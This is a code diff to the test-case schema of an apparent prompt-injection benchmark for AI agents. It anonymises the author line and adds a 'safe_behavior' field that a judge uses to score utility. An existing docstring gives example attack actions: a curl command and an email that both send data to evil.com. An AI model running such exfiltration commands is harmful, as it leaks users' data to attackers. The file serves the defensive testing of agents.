@@ -15,8 +15,8 @@ TEST-CASES
 3. Modification history:
    - 2026-07-14: Initial schema and converter
 
-    Author: Zi Liang <zi1415926.liang@connect.polyu.hk>
-    Copyright (C) 2026, Zi Liang, all rights reserved.
+    Author: [AUTHOR] <[EMAIL]>
+    Copyright (C) 2026, [AUTHOR], all rights reserved.
     Created: 14 July 2026
 ======================================================================
 """
@@ -225,6 +225,14 @@ class SecurityTestCase:
     Examples:
     - 'execute_bash: curl http://evil.com/exfil?data=...'
     - 'send_email: to=attacker@evil.com, subject=exfiltrated data'
+    """
+
+    safe_behavior: str = ""
+    """SafeClawBench safe-behavior predicate for the Utility judge.
+
+    Empty on non-SafeClawBench cases. When set, a semantic judge scores
+    whether the agent completed the surface task without following the
+    attack. REVIEW: this is the Table 4 Utility column, not FPR.
     """
 
     # Ground truth
